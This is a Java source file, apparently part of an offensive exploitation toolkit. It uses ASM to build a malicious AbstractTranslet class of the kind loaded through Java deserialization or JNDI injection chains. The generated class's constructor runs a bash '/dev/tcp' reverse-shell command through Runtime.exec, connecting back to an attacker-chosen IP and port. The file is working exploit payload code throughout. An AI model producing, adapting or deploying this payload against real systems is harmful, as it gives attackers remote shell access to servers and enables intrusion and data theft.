package com.qi4l.JYso.template;

import com.qi4l.JYso.gadgets.utils.Utils;
import org.objectweb.asm.*;

import static org.objectweb.asm.Opcodes.*;

public class ReverseShellTemplate implements Template {
    private final String className;
    private byte[] bytes;
    private final String ip;
    private final int port;

    public ReverseShellTemplate(String ip, int port) {
        this.ip = ip;
        this.port = port;
        this.className = "Exploit" + Utils.getRandomString();
        generate();
    }

    public ReverseShellTemplate(String ip, String port, String className) {
        this.ip = ip;
        this.port = Integer.parseInt(port);
        this.className = className;
        generate();
    }

    @Override
    public String getClassName() {
        return className;
    }

    @Override
    public byte[] getBytes() {
        return bytes;
    }

    @Override
    public void generate() {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);

        cw.visit(V1_6, ACC_PUBLIC | ACC_SUPER, className, null,
                "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", null);

        cw.visitField(ACC_PRIVATE, "ip", "Ljava/lang/String;", null, null).visitEnd();
        cw.visitField(ACC_PRIVATE, "port", "I", null, null).visitEnd();

        MethodVisitor mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
        mv.visitCode();
        Label startTry = new Label();
        Label endTry = new Label();
        Label catchBlock = new Label();
        mv.visitTryCatchBlock(startTry, endTry, catchBlock, "java/lang/Exception");

        mv.visitVarInsn(ALOAD, 0);
        mv.visitMethodInsn(INVOKESPECIAL,
                "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet",
                "<init>", "()V", false);

        mv.visitFieldInsn(GETSTATIC, "java/io/File", "separator", "Ljava/lang/String;");
        mv.visitLdcInsn("/");
        mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "equals",
                "(Ljava/lang/Object;)Z", false);
        Label unixBlock = new Label();
        mv.visitJumpInsn(IFEQ, unixBlock);

        mv.visitInsn(ICONST_3);
        mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
        mv.visitInsn(DUP);
        mv.visitInsn(ICONST_0);
        mv.visitLdcInsn("/bin/bash");
        mv.visitInsn(AASTORE);
        mv.visitInsn(DUP);
        mv.visitInsn(ICONST_1);
        mv.visitLdcInsn("-c");
        mv.visitInsn(AASTORE);
        mv.visitInsn(DUP);
        mv.visitInsn(ICONST_2);
        mv.visitLdcInsn("/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1");
        mv.visitInsn(AASTORE);
        mv.visitVarInsn(ASTORE, 1);

        mv.visitLabel(startTry);
        mv.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime",
                "()Ljava/lang/Runtime;", false);
        mv.visitVarInsn(ALOAD, 1);
        mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                "([Ljava/lang/String;)Ljava/lang/Process;", false);
        mv.visitInsn(POP);
        mv.visitLabel(endTry);
        mv.visitJumpInsn(GOTO, unixBlock);

        mv.visitLabel(catchBlock);
        mv.visitVarInsn(ASTORE, 2);
        mv.visitVarInsn(ALOAD, 2);
        mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace",
                "()V", false);

        mv.visitLabel(unixBlock);
        mv.visitInsn(RETURN);
        mv.visitEnd();

        mv = cw.visitMethod(ACC_PUBLIC, "transform",
                "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V",
                null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
        mv.visitCode();
        mv.visitInsn(RETURN);
        mv.visitEnd();

        mv = cw.visitMethod(ACC_PUBLIC, "transform",
                "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V",
                null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
        mv.visitCode();
        mv.visitInsn(RETURN);
        mv.visitEnd();

        cw.visitEnd();
        bytes = cw.toByteArray();
    }
}
